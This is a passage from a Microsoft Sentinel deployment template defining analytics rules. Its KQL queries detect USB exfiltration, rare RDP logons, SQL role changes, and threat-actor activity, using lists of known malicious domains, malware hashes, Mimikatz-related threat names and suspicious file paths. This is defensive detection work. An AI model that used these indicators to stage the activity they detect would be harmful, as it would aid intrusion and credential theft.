          "enabled": true,
          "query": "union isfuzzy=true\n(DeviceFileEvents\n| where FolderPath endswith \"vmware-vmdmp.log\"\n| extend HostCustomEntity = DeviceName, timestamp=TimeGenerated),\n(WindowsEvent\n| where EventID == 4663 and EventData has \"vmware-vmdmp.log\"\n| extend ObjectName = tostring(EventData.ObjectName) \n| where ObjectName endswith \"vmware-vmdmp.log\"\n| extend HostCustomEntity = Computer, timestamp=TimeGenerated),\n(SecurityEvent\n| where EventID == 4663\n| where ObjectName endswith \"vmware-vmdmp.log\"\n| extend HostCustomEntity = Computer, timestamp=TimeGenerated),\n(imFileEvent\n| where TargetFileName endswith \"vmware-vmdmp.log\"\n| extend HostCustomEntity = DvcHostname, timestamp=TimeGenerated\n)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1554"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "c0e84221-f240-4dd7-ab1e-37e034ea2a4e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d947c75e-ecc7-4d5c-8df4-e56e384d5d2e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d947c75e-ecc7-4d5c-8df4-e56e384d5d2e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SQL User deleted from Database",
          "description": "This hunting query identifies deletion of user from SQL Database\nThis query is based on the SQLEvent KQL Parser function (link below)\nSQLEvent KQL Parser provided at https://github.com/Azure/Azure-Sentinel/tree/master/Parsers/SQLSever\nDetailed blog post on Monitoring SQL Server with Microsoft Sentinel https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-sql-server-with-azure-sentinel/ba-p/150296",
          "severity": "Medium",
          "enabled": true,
          "query": "\n// SQLEvent is not the table name, it is the function name that should already be imported into your workspace.\n// The underlying table where the data exists is the Event table.\n// This query checks for user removed from a database by parsing the statement field at the query time.\n//\nSQLEvent\n| where Statement has \"Alter role\" and Statement has \"drop member\"\n| parse Statement with * \"DROP MEMBER [\" TargetUser:string \"]\" *\n| project TimeGenerated, Computer, Action, ClientIP, CurrentUser, DatabaseName, TargetUser, ObjectName, Statement\n| extend timestamp = TimeGenerated, AccountCustomEntity = CurrentUser, IPCustomEntity = ClientIP  \n",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation",
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/95491e95-8df6-4b25-85fc-0741bee5ee0c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/95491e95-8df6-4b25-85fc-0741bee5ee0c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Mass Download & copy to USB device by single user",
          "description": "This query looks for any mass download by a single user with possible file copy activity to a new USB drive. Malicious insiders may perform such activities that may cause harm to the organization. \nThis query could also reveal unintentional insider that had no intention of malicious activity but their actions may impact an organizations security posture.\nReference:https://docs.microsoft.com/defender-cloud-apps/policy-template-reference",
          "severity": "Medium",
          "enabled": true,
          "query": "let Alerts = SecurityAlert\n| where AlertName =~ \"mass download by a single user\"\n| where Status != 'Resolved'\n| extend ipEnt = parse_json(Entities), accountEnt = parse_json(Entities)\n| mv-apply tempParams = ipEnt on (\nmv-expand ipEnt\n| where ipEnt.Type == \"ip\" \n| extend IpAddress = tostring(ipEnt.Address)\n)\n| mv-apply tempParams = accountEnt on (\nmv-expand accountEnt\n| where accountEnt.Type == \"account\"\n| extend AADUserId = tostring(accountEnt.AadUserId)\n)\n| extend Alert_TimeGenerated = TimeGenerated\n| distinct Alert_TimeGenerated, IpAddress, AADUserId, DisplayName, Description, ProductName, ExtendedProperties, Entities, Status, CompromisedEntity\n;\nlet CA_Events = CloudAppEvents\n| where ActionType == \"FileDownloaded\"\n| extend parsed = parse_json(RawEventData)\n| extend UserId = tostring(parsed.UserId)\n| extend FileName = tostring(parsed.SourceFileName)\n| extend FileExtension = tostring(parsed.SourceFileExtension)\n| summarize CloudAppEvent_StartTime = min(TimeGenerated), CloudAppEvent_EndTime = max(TimeGenerated), CloudAppEvent_Files = make_set(FileName), FileCount = dcount(FileName) by Application, AccountObjectId, UserId, IPAddress, City, CountryCode\n| extend CloudAppEvents_Details = pack_all();\nlet CA_Alerts_Events = Alerts | join kind=inner (CA_Events)\non $left.AADUserId == $right.AccountObjectId and $left.IpAddress == $right.IPAddress\n// Cloud app event comes before Alert\n| where CloudAppEvent_EndTime <= Alert_TimeGenerated\n| project Alert_TimeGenerated, UserId, AADUserId, IPAddress, CloudAppEvents_Details, CloudAppEvent_Files\n;\n// setup list to filter DeviceFileEvents for only files downloaded as indicated by CloudAppEvents\nlet CA_FileList = CA_Alerts_Events | project CloudAppEvent_Files;\nCA_Alerts_Events\n| join kind=inner ( DeviceFileEvents\n| where ActionType in (\"FileCreated\", \"FileRenamed\")\n| where FileName in~ (CA_FileList)\n| summarize DeviceFileEvent_StartTime = min(TimeGenerated), DeviceFileEvent_EndTime = max(TimeGenerated), DeviceFileEvent_Files = make_set(FolderPath), DeviceFileEvent_FileCount = dcount(FolderPath) by InitiatingProcessAccountUpn, DeviceId, DeviceName, InitiatingProcessFolderPath, InitiatingProcessParentFileName//, InitiatingProcessCommandLine\n| extend DeviceFileEvents_Details = pack_all()\n) on $left.UserId == $right.InitiatingProcessAccountUpn\n| where DeviceFileEvent_StartTime >= Alert_TimeGenerated\n| join kind=inner (\n// get device events where a USB drive was mounted\nDeviceEvents\n| where ActionType == \"UsbDriveMounted\"\n| extend parsed = parse_json(AdditionalFields)\n| extend USB_DriveLetter = tostring(AdditionalFields.DriveLetter), USB_ProductName = tostring(AdditionalFields.ProductName), USB_Volume = tostring(AdditionalFields.Volume)\n| where isnotempty(USB_DriveLetter)\n| project USB_TimeGenerated = TimeGenerated, DeviceId, USB_DriveLetter, USB_ProductName, USB_Volume\n| extend USB_Details = pack_all()\n)  \non DeviceId\n// USB event occurs after the Alert\n| where USB_TimeGenerated >= Alert_TimeGenerated\n| mv-expand DeviceFileEvent_Files\n| extend DeviceFileEvent_Files = tostring(DeviceFileEvent_Files)\n// make sure that we only pickup the files that have the USB drive letter\n| where DeviceFileEvent_Files startswith USB_DriveLetter\n| summarize USB_Drive_MatchedFiles = make_set_if(DeviceFileEvent_Files, DeviceFileEvent_Files startswith USB_DriveLetter) by Alert_TimeGenerated, USB_TimeGenerated, UserId, AADUserId, DeviceId, DeviceName, IPAddress, CloudAppEvents_Details = tostring(CloudAppEvents_Details), DeviceFileEvents_Details = tostring(DeviceFileEvents_Details), USB_Details = tostring(USB_Details)\n| extend InitiatingProcessFileName = tostring(split(todynamic(DeviceFileEvents_Details).InitiatingProcessFolderPath, \"\\\\\")[-1]), InitiatingProcessFolderPath = tostring(todynamic(DeviceFileEvents_Details).InitiatingProcessFolderPath)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1052"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "6267ce44-1e9d-471b-9f1e-ae76a6b7aa84",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserId"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "AADUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DeviceName"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "InitiatingProcessFileName"
                },
                {
                  "identifier": "Directory",
                  "columnName": "InitiatingProcessFolderPath"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7c258e0f-9112-459e-9ffe-62456b785ccb')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7c258e0f-9112-459e-9ffe-62456b785ccb')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Rare RDP Connections",
          "description": "Identifies when an RDP connection is new or rare related to any logon type by a given account today based on comparison with the previous 14 days.\nRDP connections are indicated by the EventID 4624 with LogonType = 10",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = 14d;\nlet endtime = 1d;\n(union isfuzzy=true\n(SecurityEvent\n| where TimeGenerated >= ago(endtime)\n| where EventID == 4624 and LogonType == 10\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), ConnectionCount = count()\nby Account = tolower(Account), Computer = toupper(Computer), IpAddress, AccountType, Activity, LogonTypeName, ProcessName\n// use left anti to exclude anything from the previous 14 days that is not rare\n),\n(WindowsEvent\n| where TimeGenerated >= ago(endtime)\n| where EventID == 4624 and EventData has (\"10\")\n| extend LogonType = tostring(EventData.LogonType)\n| where  LogonType == 10 \n| extend Account = strcat(tostring(EventData.TargetDomainName),\"\\\\\", tostring(EventData.TargetUserName))\n| extend ProcessName = tostring(EventData.ProcessName)\n| extend IpAddress = tostring(EventData.IpAddress)\n| extend TargetUserSid = tostring(EventData.TargetUserSid)\n| extend AccountType=case(Account endswith \"$\" or TargetUserSid in (\"S-1-5-18\", \"S-1-5-19\", \"S-1-5-20\"), \"Machine\", isempty(TargetUserSid), \"\", \"User\")\n| extend Activity=\"4624 - An account was successfully logged on.\"\n| extend LogonTypeName=\"10 - RemoteInteractive\"\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), ConnectionCount = count()\nby Account = tolower(Account), Computer = toupper(Computer), IpAddress, AccountType, Activity, LogonTypeName, ProcessName\n))\n| join kind=leftanti (\n(union isfuzzy=true\n(SecurityEvent\n| where TimeGenerated between (ago(starttime) .. ago(endtime))\n| where EventID == 4624\n| summarize by Computer = toupper(Computer), IpAddress, Account = tolower(Account)\n),\n( WindowsEvent\n| where TimeGenerated between (ago(starttime) .. ago(endtime))\n| where EventID == 4624\n| extend IpAddress = tostring(EventData.IpAddress)\n| extend Account = strcat(tostring(EventData.TargetDomainName),\"\\\\\", tostring(EventData.TargetUserName))\n| summarize by Computer = toupper(Computer), IpAddress, Account = tolower(Account)\n))\n) on Account, Computer\n| summarize StartTime = min(StartTime), EndTime = max(EndTime), ConnectionCount = sum(ConnectionCount)\nby Account, Computer, IpAddress, AccountType, Activity, LogonTypeName, ProcessName\n| extend timestamp = StartTime, AccountCustomEntity = Account, HostCustomEntity = Computer, IPCustomEntity = IpAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [
            "T1021"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "45b903c5-6f56-4969-af10-ae62ac709718",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/832b2334-7f3d-4fb8-b7d7-3e73784ee828')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/832b2334-7f3d-4fb8-b7d7-3e73784ee828')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "ThreatIntelligence",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "enabled": true,
          "alertRuleTemplateName": "0dd422ee-e6af-4204-b219-f59ac172e4c6",
          "description": "This rule generates an alert when a Microsoft Threat Intelligence Indicator gets matched with your event logs. The alerts are very high fidelity.\n\nNote : It is advised to turn off any custom alert rules which match the threat intelligence indicators with the same event logs matched by this analytics to prevent duplicate alerts.",
          "displayName": "(Preview) Microsoft Threat Intelligence Analytics",
          "severity": "Medium",
          "tactics": [
            "Persistence",
            "LateralMovement"
          ],
          "techniques": [],
          "subTechniques": []
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3dafb61e-9a9d-4b28-908e-9a4d5390c3e9')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3dafb61e-9a9d-4b28-908e-9a4d5390c3e9')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known CERIUM domains and hashes",
          "description": "CERIUM malicious webserver and hash values for maldocs and malware. \n Matches domain name IOCs related to the CERIUM activity group with CommonSecurityLog, DnsEvents, and VMConnection dataTypes.",
          "severity": "High",
          "enabled": true,
          "query": "let DomainNames = \"miniodaum.ml\";\nlet SHA256Hash = dynamic ([\"53f5773bbfbfbee660989d135c042c9f6f69024b9a4b65bdc0dfd44771762257\", \"0897c80df8b80b4c49bf1ccf876f5f782849608b830c3b5cb3ad212dc3e19eff\"]);\n(union isfuzzy=true\n(CommonSecurityLog \n| parse Message with * '(' DNSName ')' * \n| where isnotempty(FileHash)\n| where FileHash in (SHA256Hash) or DNSName =~ DomainNames\n| extend Account = SourceUserID, Computer = DeviceName, IPAddress = SourceIP\n),\n (_Im_Dns (domain_has_any=DomainNames)\n| extend DNSName = DnsQuery \n| extend IPAddress =  SrcIpAddr, Computer = Dvc\n), \n(_Im_WebSession(url_has_any=DomainNames) \n| extend DNSName = tostring(parse_url(Url)[\"Host\"])\n| extend IPAddress = SrcIpAddr, Account=User\n),\n(VMConnection \n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| where isnotempty(DNSName)\n| where DNSName =~ DomainNames\n| extend IPAddress = RemoteIp\n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (DomainNames)  \n| extend DNSName = DestinationHost \n| extend IPAddress = SourceHost\n)\n)\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer, IPCustomEntity = IPAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "CredentialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "c87fb346-ea3a-4c64-ba92-3dd383e0f0b5",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/be7e8bf2-8f37-4fd7-9d83-71ae3bbdd915')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/be7e8bf2-8f37-4fd7-9d83-71ae3bbdd915')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Solorigate Network Beacon",
          "description": "Identifies a match across various data feeds for domains IOCs related to the Solorigate incident.\n References: https://blogs.microsoft.com/on-the-issues/2020/12/13/customers-protect-nation-state-cyberattacks/, \n https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html?1",
          "severity": "High",
          "enabled": true,
          "query": "let domains = dynamic([\"incomeupdate.com\",\"zupertech.com\",\"databasegalore.com\",\"panhardware.com\",\"avsvmcloud.com\",\"digitalcollege.org\",\"freescanonline.com\",\"deftsecurity.com\",\"thedoccloud.com\",\"virtualdataserver.com\",\"lcomputers.com\",\"webcodez.com\",\"globalnetworkissues.com\",\"kubecloud.com\",\"seobundlekit.com\",\"solartrackingsystem.net\",\"virtualwebdata.com\"]);\n(union isfuzzy=true\n(CommonSecurityLog \n  | parse Message with * '(' DNSName ')' * \n  | where DNSName in~ (domains) or DestinationHostName has_any (domains) or RequestURL has_any(domains)\n  | extend AccountCustomEntity = SourceUserID, HostCustomEntity = DeviceName, IPCustomEntity = SourceIP\n  ),\n(_Im_Dns (domain_has_any=domains)\n  | extend DNSName = DnsQuery\n  | extend IPCustomEntity = SrcIpAddr\n  ),\n(VMConnection \n  | parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n  | where isnotempty(DNSName)\n  | where DNSName in~ (domains)\n  | extend IPCustomEntity = RemoteIp\n  ),\n(DeviceNetworkEvents \n  | where isnotempty(RemoteUrl) \n  | where RemoteUrl  has_any (domains)  \n  | extend DNSName = RemoteUrl\n  | extend IPCustomEntity = RemoteIP \n  | extend HostCustomEntity = DeviceName \n  ),\n(AzureDiagnostics \n  | where ResourceType == \"AZUREFIREWALLS\"\n  | where Category == \"AzureFirewallApplicationRule\"\n  | parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n  | where isnotempty(DestinationHost)\n  | where DestinationHost has_any (domains)  \n  | extend DNSName = DestinationHost \n  | extend IPCustomEntity = SourceHost\n  ) \n  )",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1102"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "cecdbd4c-4902-403c-8d4b-32eb1efe460b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "DNS",
              "fieldMappings": [
                {
                  "identifier": "DomainName",
                  "columnName": "DNSName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7b62b9c5-cb29-4b63-aaf9-8bf62c0f5708')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7b62b9c5-cb29-4b63-aaf9-8bf62c0f5708')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Dev-0228 File Path Hashes November 2021 (ASIM Version)",
          "description": "This hunting query looks for file paths/hashes related to observed activity by Dev-0228. The actor is known to use custom version of popular tool like PsExec, Procdump etc. to carry its activity.\n The risk score associated with each result is based on a number of factors, hosts with higher risk events should be investigated first.\n This query uses the Microsoft Sentinel Information Model - https://docs.microsoft.com/azure/sentinel/normalization",
          "severity": "High",
          "enabled": true,
          "query": "let files1 = dynamic([\"C:\\\\Windows\\\\TAPI\\\\lsa.exe\", \"C:\\\\Windows\\\\TAPI\\\\pa.exe\", \"C:\\\\Windows\\\\TAPI\\\\pc.exe\", \"C:\\\\Windows\\\\TAPI\\\\Rar.exe\"]);\nlet files2 = dynamic([\"svchost.exe\",\"wdmsvc.exe\"]);\nlet FileHash1 = dynamic([\"43109fbe8b752f7a9076eaafa417d9ae5c6e827cd5374b866672263fdebd5ec3\", \"ab50d8d707b97712178a92bbac74ccc2a5699eb41c17aa77f713ff3e568dcedb\", \"010e32be0f86545e116a8bc3381a8428933eb8789f32c261c81fd5e7857d4a77\",     \"56cd102b9fc7f3523dad01d632525ff673259dbc9a091be0feff333c931574f7\"]);\nlet FileHash2 = dynamic([\"2a1044e9e6e87a032f80c6d9ea6ae61bbbb053c0a21b186ecb3b812b49eb03b7\", \"9ab7e99ed84f94a7b6409b87e56dc6e1143b05034a5e4455e8c555dbbcd0d2dd\", \"18a072ccfab239e140d8f682e2874e8ff19d94311fc8bb9564043d3e0deda54b\"]);\nimFileEvent\n| where ((FilePath has_any (files1)) and (ActingProcessSHA256 has_any (FileHash1))) or ((FilePath has_any (files2)) and (ActingProcessSHA256 has_any (FileHash2)))\n// Increase risk score if recent alerts for the host\n| join kind=leftouter (SecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| mv-expand todynamic(Entities)\n| extend DvcId = tostring(parse_json(Entities).MdatpDeviceId)\n| where isnotempty(DvcId)\n// Higher risk score are for Defender alerts related to threat actor\n| extend AlertRiskScore = iif(ThreatName has_any (\"Backdoor:MSIL/ShellClient.A\", \"Backdoor:MSIL/ShellClient.A!dll\", \"Trojan:MSIL/Mimikatz.BA!MTB\"), 1.0, 0.5)\n| project DvcId, AlertRiskScore) on DvcId\n| extend AlertRiskScore = iif(isempty(AlertRiskScore), 0.0, AlertRiskScore)\n| extend timestamp = TimeGenerated, HostCustomEntity = Dvc, AccountCustomEntity = ActorUsername",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "Execution"
          ],
          "techniques": [
            "T1569",
            "T1003"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "29a29e5d-354e-4f5e-8321-8b39d25047bf",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "FileName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b12e6bd7-3506-41fc-be4f-64685b9c9309')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b12e6bd7-3506-41fc-be4f-64685b9c9309')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Azure VM Run Command operation executed during suspicious login window",
          "description": "Identifies when the Azure Run Command operation is executed by a UserPrincipalName and IP Address  \nthat has resulted in a recent user entity behaviour alert.",
          "severity": "High",
          "enabled": true,
          "query": "AzureActivity\n// Isolate run command actions\n| where OperationNameValue == \"MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION\"\n// Confirm that the operation impacted a virtual machine\n| where Authorization has \"virtualMachines\"\n// Each runcommand operation consists of three events when successful, Started, Accepted (or Rejected), Successful (or Failed).\n| summarize StartTime=min(TimeGenerated), EndTime=max(TimeGenerated), max(CallerIpAddress), make_list(ActivityStatusValue) by CorrelationId, Authorization, Caller\n// Limit to Run Command executions that Succeeded\n| where list_ActivityStatusValue has \"Success\"\n// Extract data from the Authorization field\n| extend Authorization_d = parse_json(Authorization)\n| extend Scope = Authorization_d.scope\n| extend Scope_s = split(Scope, \"/\")\n| extend Subscription = tostring(Scope_s[2])\n| extend VirtualMachineName = tostring(Scope_s[-1])\n| project StartTime, EndTime, Subscription, VirtualMachineName, CorrelationId, Caller, CallerIpAddress=max_CallerIpAddress\n// Create a join key using  the Caller (UPN)\n| extend joinkey = tolower(Caller)\n// Join the Run Command actions to UEBA data\n| join kind = inner (\n    BehaviorAnalytics\n    // We are specifically interested in unusual logins\n    | where EventSource == \"Azure AD\" and ActivityInsights.ActionUncommonlyPerformedByUser == \"True\"\n    | project UEBAEventTime=TimeGenerated, UEBAActionType=ActionType, UserPrincipalName, UEBASourceIPLocation=SourceIPLocation, UEBAActivityInsights=ActivityInsights, UEBAUsersInsights=UsersInsights\n    | where isnotempty(UserPrincipalName) and isnotempty(UEBASourceIPLocation)\n    | extend joinkey = tolower(UserPrincipalName)\n) on joinkey\n// Create a window around the UEBA event times, check to see if the Run Command action was performed within 